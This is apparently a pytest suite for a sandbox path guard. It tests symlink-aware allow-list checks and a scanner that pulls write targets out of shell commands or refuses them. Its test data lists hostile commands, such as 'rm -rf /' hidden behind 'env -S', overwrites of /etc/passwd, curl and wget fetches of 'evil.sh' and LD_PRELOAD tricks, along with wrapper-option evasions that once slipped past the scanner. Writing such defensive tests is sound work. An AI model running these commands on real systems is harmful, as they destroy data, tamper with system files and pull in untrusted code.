"""Tests for titanx.sandbox.path_guard.

Critical test: is_path_allowed MUST resolve symlinks before the allow-list check.
Without resolve, an attacker can place a symlink inside an allowed directory that
points to a forbidden location, bypassing the guard.
"""
from __future__ import annotations

import os
from pathlib import Path

import pytest

from titanx.sandbox.path_guard import (
    extract_shell_write_targets,
    is_path_allowed,
    scan_shell_write_targets,
)


class TestIsPathAllowed:
    def test_exact_match_allowed(self, tmp_path: Path) -> None:
        assert is_path_allowed(str(tmp_path), [str(tmp_path)])

    def test_descendant_allowed(self, tmp_path: Path) -> None:
        target = tmp_path / "a" / "b.txt"
        assert is_path_allowed(str(target), [str(tmp_path)])

    def test_sibling_not_allowed(self, tmp_path: Path) -> None:
        sibling = tmp_path.parent / "outside"
        assert not is_path_allowed(str(sibling), [str(tmp_path)])

    def test_traversal_rejected(self, tmp_path: Path) -> None:
        escape = f"{tmp_path}/../etc/passwd"
        assert not is_path_allowed(escape, [str(tmp_path)])

    def test_symlink_bypass_blocked(self, tmp_path: Path) -> None:
        """The regression test for the original vulnerability.

        An allow-listed directory contains a symlink that points at a forbidden
        location. The guard must refuse the write.
        """
        allowed = tmp_path / "workspace"
        allowed.mkdir()
        forbidden = tmp_path / "secret.txt"
        forbidden.write_text("classified")
        link = allowed / "link"
        os.symlink(forbidden, link)

        assert not is_path_allowed(str(link), [str(allowed)])

    def test_symlink_inside_allowed_ok(self, tmp_path: Path) -> None:
        """A symlink that resolves back inside the allow-list must be accepted."""
        allowed = tmp_path / "workspace"
        allowed.mkdir()
        real = allowed / "file.txt"
        real.write_text("ok")
        link = allowed / "link"
        os.symlink(real, link)

        assert is_path_allowed(str(link), [str(allowed)])

    def test_allow_path_is_symlink(self, tmp_path: Path) -> None:
        """If the allow-list entry is itself a symlink (e.g. /tmp on macOS),
        resolving both sides keeps the check consistent.
        """
        real = tmp_path / "real_workspace"
        real.mkdir()
        link = tmp_path / "link_workspace"
        os.symlink(real, link)
        target = real / "a.txt"
        target.write_text("x")

        assert is_path_allowed(str(target), [str(link)])
        assert is_path_allowed(str(link / "a.txt"), [str(real)])

    def test_empty_allowed_list_rejects(self, tmp_path: Path) -> None:
        assert not is_path_allowed(str(tmp_path / "x"), [])


class TestExtractShellWriteTargets:
    def test_redirect_gt(self) -> None:
        assert extract_shell_write_targets("echo x > /etc/passwd") == ["/etc/passwd"]

    def test_redirect_append(self) -> None:
        assert extract_shell_write_targets("echo x >> /var/log/app.log") == ["/var/log/app.log"]

    def test_tee(self) -> None:
        assert extract_shell_write_targets("echo x | tee /tmp/out.txt") == ["/tmp/out.txt"]

    def test_tee_append(self) -> None:
        assert extract_shell_write_targets("echo x | tee -a /tmp/out.txt") == ["/tmp/out.txt"]

    def test_no_write(self) -> None:
        assert extract_shell_write_targets("cat /etc/hosts") == []


class TestWriteTargetDetectionGaps:
    """Flag-form / verb-form gaps found by adversarial probing.

    The static scanner is defence-in-depth, but it advertises "fail closed":
    a write-capable command whose target it cannot name should either be
    detected or refused — never silently passed with an empty target list.
    Each case below was a silent pass before the fix.
    """

    @pytest.mark.parametrize("command,expected", [
        ("sed --in-place 's/a/b/' /etc/passwd", "/etc/passwd"),
        ("sed --in-place=.bak 's/a/b/' /etc/passwd", "/etc/passwd"),
        ("cp -t /etc foo", "/etc"),
        ("cp --target-directory=/etc foo", "/etc"),
        ("mv -t /etc foo", "/etc"),
        ("install --target-directory /usr/local/bin foo", "/usr/local/bin"),
        ("curl -o/etc/x http://h/", "/etc/x"),
        ("curl --output=/etc/x http://h/", "/etc/x"),
        ("wget -O/etc/x http://h/", "/etc/x"),
        ("wget --output-document=/etc/x http://h/", "/etc/x"),
        ("/bin/cp foo /etc/x", "/etc/x"),
        ("/usr/bin/tee /etc/x", "/etc/x"),
        ("busybox dd of=/etc/x", "/etc/x"),
        ("tar -cf /etc/out.tar f", "/etc/out.tar"),
        ("tar cf /etc/out.tar f", "/etc/out.tar"),
    ])
    def test_flag_and_verb_forms_are_detected(self, command: str, expected: str) -> None:
        targets = extract_shell_write_targets(command)
        assert expected in targets, f"{command!r} -> {targets}"

    @pytest.mark.parametrize("command", [
        "tar xf a.tar -C /etc",   # traditional (no-dash) extract
        "tar xf a.tar",
        "bash -ccmd",             # fused inline-code flag
        "bash -lc 'echo x'",      # combined login+command cluster
        "/bin/bash -c 'echo x'",  # path-prefixed shell
        "python3 -c'import os'",  # fused python inline code
    ])
    def test_unanalysable_commands_are_refused(self, command: str) -> None:
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is not None, f"{command!r} was not refused"

    def test_tar_no_dash_list_is_not_treated_as_extract(self) -> None:
        # `tvf` = list (read-only); must not be refused as an extract.
        scan = scan_shell_write_targets("tar tvf /etc/a.tar")
        assert scan.refuse_reason is None

    def test_source_named_with_x_is_not_a_false_extract(self) -> None:
        # A source operand containing the letter x must not trip the
        # traditional-cluster extract heuristic.
        scan = scan_shell_write_targets("tar cf /tmp/out.tar myxfile")
        assert scan.refuse_reason is None
        assert "/tmp/out.tar" in scan.targets


class TestReviewHardeningGaps:
    """Gaps found by a second adversarial pass over the first fix.

    Two of these are regressions the first pass *introduced* — the rsync
    `-t` collision and the tar cluster re-parse — which is why they are
    pinned here alongside the originally-missed bundled-flag and wrapper
    forms.
    """

    # ── rsync: `-t` is --times, NOT --target-directory ──────────────────
    def test_rsync_times_flag_does_not_shadow_destination(self) -> None:
        # `-t`/--times preserves mtimes; the destination is the last
        # operand. Treating -t as a target dir dropped the real dest and
        # recorded a bogus source path.
        scan = scan_shell_write_targets("rsync -t /tmp/a /etc/passwd")
        assert scan.refuse_reason is None
        assert "/etc/passwd" in scan.targets
        assert "/tmp/a" not in scan.targets

    def test_rsync_plain_destination(self) -> None:
        scan = scan_shell_write_targets("rsync -a src/ /etc/dst/")
        assert scan.refuse_reason is None
        assert "/etc/dst/" in scan.targets

    # ── tar: cluster must not re-parse a following alpha source ─────────
    def test_tar_dash_cluster_keeps_alpha_source_as_source(self) -> None:
        scan = scan_shell_write_targets("tar -cf /etc/passwd foo")
        assert scan.refuse_reason is None
        assert "/etc/passwd" in scan.targets

    def test_tar_dash_cluster_source_with_x_not_a_false_extract(self) -> None:
        scan = scan_shell_write_targets("tar -cf /tmp/out.tar myxfile")
        assert scan.refuse_reason is None
        assert "/tmp/out.tar" in scan.targets

    # ── bundled short-option clusters ───────────────────────────────────
    @pytest.mark.parametrize("command,expected", [
        ("cp -rt /etc foo", "/etc"),
        ("mv -ft /etc foo", "/etc"),
        ("install -Dt /usr/local/bin foo", "/usr/local/bin"),
        ("sed -ni 's/a/b/' /etc/passwd", "/etc/passwd"),
        ("curl -so /etc/x http://h/", "/etc/x"),
        ("wget -qO /etc/x http://h/", "/etc/x"),
    ])
    def test_bundled_flag_forms_are_detected(self, command: str, expected: str) -> None:
        targets = extract_shell_write_targets(command)
        assert expected in targets, f"{command!r} -> {targets}"

    # ── wrapper verbs must be unwrapped before the -c refusal ────────────
    def test_cp_cluster_with_value_taking_S_is_not_a_target_dir(self) -> None:
        # `-St` is -S<SUFFIX> (value "t"), not -t DIR; the destination is
        # still the last operand (/etc/b), and /etc/a is the source.
        scan = scan_shell_write_targets("cp -St /etc/a /etc/b")
        assert scan.refuse_reason is None
        assert "/etc/b" in scan.targets
        assert "/etc/a" not in scan.targets

    @pytest.mark.parametrize("command", [
        "env bash -c 'echo x'",
        "timeout 5 bash -c 'echo x'",
        "nice -n 10 bash -c 'echo x'",
        "nohup bash -c 'echo x'",
        "xargs bash -c 'echo x'",
        "env FOO=bar python3 -c 'import os'",
    ])
    def test_wrapped_inline_shell_is_refused(self, command: str) -> None:
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is not None, f"{command!r} was not refused"

    def test_wrapper_without_inline_code_is_not_refused(self) -> None:
        scan = scan_shell_write_targets("timeout 5 tar cf /tmp/out.tar f")
        assert scan.refuse_reason is None
        assert "/tmp/out.tar" in scan.targets

    # ── wrapper options that take a *separate* value ────────────────────
    @pytest.mark.parametrize("command", [
        "env -u X bash -c 'echo x'",
        "env -C /tmp bash -c 'echo x'",
        "timeout -s KILL 5 bash -c 'echo x'",
        "timeout -k 5 10 bash -c 'echo x'",
        "xargs -a list bash -c 'echo x'",
        "xargs -n 1 bash -c 'echo x'",
        "env PATH=/usr/bin bash -c 'echo x'",
        "env LD_PRELOAD=/lib/x.so bash -c 'echo x'",
    ])
    def test_wrapped_inline_shell_with_option_values_is_refused(
        self, command: str
    ) -> None:
        # A wrapper option whose value is a separate token must not be
        # mistaken for the wrapped command (which then hides the `-c`).
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is not None, f"{command!r} was not refused"

    def test_wrapper_option_value_does_not_hide_write_target(self) -> None:
        scan = scan_shell_write_targets("env -u X cp -t /etc foo")
        assert scan.refuse_reason is None
        assert "/etc" in scan.targets

    def test_env_split_string_is_refused(self) -> None:
        # `env -S` re-splits its value into a command; we cannot see inside
        # it, so it must be refused rather than peeled as an opaque value.
        scan = scan_shell_write_targets("env -S 'bash -c \"rm -rf /\"'")
        assert scan.refuse_reason is not None

    # ── sed: long options are flags, not file operands ──────────────────
    @pytest.mark.parametrize("command,expected", [
        ("sed --regexp-extended -i 's/a/b/' /etc/passwd", ["/etc/passwd"]),
        ("sed -i 's/a/b/' --posix /etc/passwd", ["/etc/passwd"]),
    ])
    def test_sed_long_options_are_not_file_operands(
        self, command: str, expected: list[str]
    ) -> None:
        assert extract_shell_write_targets(command) == expected


class TestWrapperPeelRegressions:
    """Regressions the *second* hardening pass introduced into the wrapper peel.

    Tightening the wrapper option scanner to skip lone `-` and to look past
    `--` opened three holes: a lone `-` was skipped instead of *terminating*
    the option scan (so the following `bash -c` was never reached), a `--`
    ended the loop before post-`--` `NAME=value` assignments, and the
    `env -S` guard matched any bundle merely *containing* an `S`
    (`-uSSH_AUTH_SOCK`) — refusing a benign command while the inline shell
    still slipped past. Each case states the secure outcome.
    """

    @pytest.mark.parametrize("command", [
        "env - bash -c 'echo x'",
        "nice - bash -c 'echo x'",
        "timeout - bash -c 'echo x'",
    ])
    def test_lone_dash_does_not_hide_inline_shell(self, command: str) -> None:
        # A lone `-` is `env -i` / a separator, not the wrapped command;
        # the shell behind it must still be refused.
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is not None, f"{command!r} was not refused"

    @pytest.mark.parametrize("command", [
        "env -- FOO=bar bash -c 'echo x'",
        "env -i -- FOO=bar bash -c 'echo x'",
    ])
    def test_env_assign_after_double_dash_is_skipped(self, command: str) -> None:
        # `--` ends *options*, but `env` still accepts NAME=value after it;
        # the assignment must not be mistaken for the command.
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is not None, f"{command!r} was not refused"

    def test_stdbuf_output_consumes_separate_value(self) -> None:
        scan = scan_shell_write_targets("stdbuf --output L bash -c 'echo x'")
        assert scan.refuse_reason is not None

    def test_env_dash_before_cp_is_peeled(self) -> None:
        scan = scan_shell_write_targets("env - cp -t /etc foo")
        assert scan.refuse_reason is None
        assert "/etc" in scan.targets

    def test_env_value_shorts_containing_S_are_not_refused(self) -> None:
        # `-uSSH_AUTH_SOCK` = `-u` with value `SSH_AUTH_SOCK`; the `S` is in
        # the *value*, not an option letter. Refusing it was a false positive.
        scan = scan_shell_write_targets("env -uSSH_AUTH_SOCK cp -t /etc foo")
        assert scan.refuse_reason is None
        assert "/etc" in scan.targets


class TestLongOptionAbbreviation:
    """GNU wrappers/verbs parse options with ``getopt_long``, which accepts
    any *unambiguous* prefix of a long option. The scanner matched option
    names literally, so `env --un X bash -c …` (``--un`` = ``--unset``)
    consumed only the option, treated ``X`` as the command, and never saw
    the inline shell; `env --s '…'` bypassed the deliberate
    ``--split-string`` refusal. Detection must follow the abbreviation.
    """

    @pytest.mark.parametrize("command", [
        "env --un X bash -c 'echo x'",
        "env --ch /tmp bash -c 'echo x'",
        "timeout --sig KILL 5 bash -c 'echo x'",
        "stdbuf --out L bash -c 'echo x'",
        "xargs --delim , bash -c 'echo x'",
        "time --out F bash -c 'echo x'",
        "xargs --process-slot-var SLOT bash -c 'echo x'",
    ])
    def test_abbreviated_value_option_does_not_hide_shell(self, command: str) -> None:
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is not None, f"{command!r} was not refused"

    @pytest.mark.parametrize("command,expected", [
        ("env --un X cp -t /etc foo", "/etc"),
        ("timeout --sig KILL 5 cp -t /etc foo", "/etc"),
        ("stdbuf --out L tee /etc/x", "/etc/x"),
        ("xargs --delim , cp -t /etc foo", "/etc"),
        ("xargs --process-slot-var SLOT tee /etc/x", "/etc/x"),
    ])
    def test_abbreviated_value_option_still_detects_target(
        self, command: str, expected: str
    ) -> None:
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is None
        assert expected in scan.targets

    @pytest.mark.parametrize("command", [
        "env --split-s 'bash -c \"echo hi\"'",
        "env --s 'bash -c \"echo hi\"'",
        "env --sp 'bash -c \"echo hi\"'",
    ])
    def test_abbreviated_split_string_is_refused(self, command: str) -> None:
        # `--split-string` is the only `env` long option starting with `s`;
        # every prefix re-splits its argument into a hidden command.
        assert scan_shell_write_targets(command).refuse_reason is not None

    @pytest.mark.parametrize("command,expected", [
        ("curl --out /etc/x http://h/", "/etc/x"),
        ("wget --output-doc /etc/x http://h/", "/etc/x"),
        ("cp --target-dir=/etc foo", "/etc"),
        ("sed --in-pl 's/a/b/' /etc/passwd", "/etc/passwd"),
    ])
    def test_verb_long_option_abbreviations_are_detected(
        self, command: str, expected: str
    ) -> None:
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is None
        assert expected in scan.targets

    @pytest.mark.parametrize("command", [
        "env --frobnicate bash",          # unrecognised
        "xargs --max 1 bash -c 'echo x'",  # --max{,-args,-procs,-chars,-lines}
    ])
    def test_unknown_or_ambiguous_wrapper_long_is_refused(self, command: str) -> None:
        # Arity of an unrecognised/ambiguous long option is unknowable;
        # guessing "no value" is how the real command hides behind it.
        assert scan_shell_write_targets(command).refuse_reason is not None

    def test_benign_wrapper_long_flags_are_not_refused(self) -> None:
        # Enumerated boolean long options must still peel.
        for command in (
            "env --ignore-environment curl -o /tmp/x http://h/",
            "timeout --foreground 5 curl -o /tmp/x http://h/",
            "xargs --no-run-if-empty echo x",
        ):
            scan = scan_shell_write_targets(command)
            assert scan.refuse_reason is None, f"{command!r} was refused"

    def test_double_dash_ends_wrapper_options(self) -> None:
        # A regression from the abbreviation pass: `--` was skipped for every
        # wrapper, so the *wrapped command's* argv (`--foo`) hit the
        # unknown-long refuse. `env -- --foo bash` is a false positive.
        scan = scan_shell_write_targets("env -- --foo bash")
        assert scan.refuse_reason is None

    def test_double_dash_then_inline_shell_still_refused(self) -> None:
        # `env` still permits NAME=value after `--`; the inline shell behind
        # them must still be refused.
        scan = scan_shell_write_targets("env -- FOO=bar bash -c 'echo x'")
        assert scan.refuse_reason is not None


class TestUnnamedWriteTargets:
    """Writes whose target is chosen by the server, or named by an option
    the handlers did not know.

    ``curl -O`` / ``wget URL`` write a *remote-derived* filename into the
    sandbox cwd; the name cannot be statically resolved, so per the module's
    fail-closed contract they must be refused, not passed with empty targets.
    ``--output-dir`` / ``-P`` confine the write to a named directory;
    ``sed --`` / tar ``--delete`` name an operand the handlers had dropped.
    """

    @pytest.mark.parametrize("command", [
        "curl -O http://h/evil.sh",
        "curl --remote-name http://h/evil.sh",
        "curl -sO http://h/evil.sh",
        "curl -J http://h/evil.sh",
        "curl -O --output-dir /etc http://h/x",
        # `-q`/`-R` are boolean curl flags; a following `-O` is a real
        # remote-name write and must not be swallowed as their argument.
        "curl -q -O http://h/x",
        "curl -q -J http://h/x",
        "curl -q --remote-name http://h/x",
        "curl -R -O http://h/x",
        "curl -R --remote-header-name http://h/x",
        "wget http://h/evil.sh",
        "wget -q http://h/evil.sh",
        # wget's `-o` is a *log* file; it does not name the download, so the
        # download is still remote-derived and must be refused.
        "wget -o /tmp/wget.log http://h/x",
        "wget --output-file=/var/log/w.log http://h/x",
        # A `--spider` consumed as another option's value is not spider mode.
        "wget --user-agent --spider http://h/x",
    ])
    def test_remote_derived_write_is_refused(self, command: str) -> None:
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is not None, f"{command!r} was not refused"

    def test_curl_to_stdout_is_not_a_write(self) -> None:
        # curl with no `-o`/`-O` streams to stdout — nothing to check.
        assert scan_shell_write_targets("curl http://h/x").refuse_reason is None

    @pytest.mark.parametrize("command", [
        "curl -o - http://h/x",
        "curl --output - http://h/x",
        "wget -O - http://h/x",
        "wget -qO- http://h/x",
        "wget --output-document - http://h/x",
    ])
    def test_output_dash_is_stdout_not_a_file(self, command: str) -> None:
        # `-o -` / `-O -` write to stdout; they must not be refused as an
        # unresolvable path, nor recorded as a write target.
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is None, f"{command!r} was refused"
        assert scan.targets == []

    def test_wget_spider_is_not_a_write(self) -> None:
        assert scan_shell_write_targets("wget --spider http://h/x").refuse_reason is None

    def test_wget_log_plus_named_output_still_records_both(self) -> None:
        scan = scan_shell_write_targets("wget -o /tmp/log -O /tmp/out http://h/x")
        assert scan.refuse_reason is None
        assert "/tmp/out" in scan.targets

    @pytest.mark.parametrize("command", [
        # A value that looks like a flag is an argument, not an option.
        "curl -d -O http://h/x",
        "curl -d -J http://h/x",
        "curl --data -O http://h/x",
        "curl -u -O http://h/x",
        "curl -H -Origin http://h/x",
        "curl -d --remote-name http://h/x",
    ])
    def test_option_value_that_looks_like_a_flag(self, command: str) -> None:
        # Regression from the first unnamed-write pass: the option scan read
        # each token in isolation, so `-O` used as `-d`'s POST data was taken
        # for a remote-name flag and the benign command was refused.
        assert scan_shell_write_targets(command).refuse_reason is None

    @pytest.mark.parametrize("command,expected", [
        ("wget -P /etc http://h/x", "/etc"),
        ("wget --directory-prefix=/etc http://h/x", "/etc"),
        ("curl --output-dir /etc http://h/x", "/etc"),
        ("curl --output-dir=/etc http://h/x", "/etc"),
        ("sed -i -- /etc/weird", "/etc/weird"),
        ("tar --delete --file=/etc/x.tar m", "/etc/x.tar"),
        ("tar --delete -f /etc/x.tar m", "/etc/x.tar"),
    ])
    def test_named_target_option_is_detected(
        self, command: str, expected: str
    ) -> None:
        scan = scan_shell_write_targets(command)
        assert scan.refuse_reason is None
        assert expected in scan.targets

    @pytest.mark.parametrize("command", [
        # A *directory* option's `-` is a literal relative directory, not
        # stdout: `wget -P -` / `curl --output-dir -` create/use a directory
        # named `-`. With no cwd to anchor it the path cannot be resolved, so
        # per the fail-closed contract they must be refused. (An earlier pass
        # reused the file-option `-`-means-stdout skip here and let these
        # through with empty targets.)
        "wget -P - http://h/x",
        "wget --directory-prefix - http://h/x",
        "wget --directory-prefix=- http://h/x",
        "curl --output-dir - http://h/x",
        "curl --output-dir=- http://h/x",
    ])
    def test_dash_output_dir_is_refused(self, command: str) -> None:
        assert scan_shell_write_targets(command).refuse_reason is not None

    def test_dash_output_dir_resolves_when_cwd_known(self) -> None:
        # With a cwd the literal `-` directory *can* be named, so it is
        # recorded rather than refused.
        scan = scan_shell_write_targets("curl --output-dir - http://h/x", cwd="/work")
        assert scan.refuse_reason is None
        assert "/work/-" in scan.targets
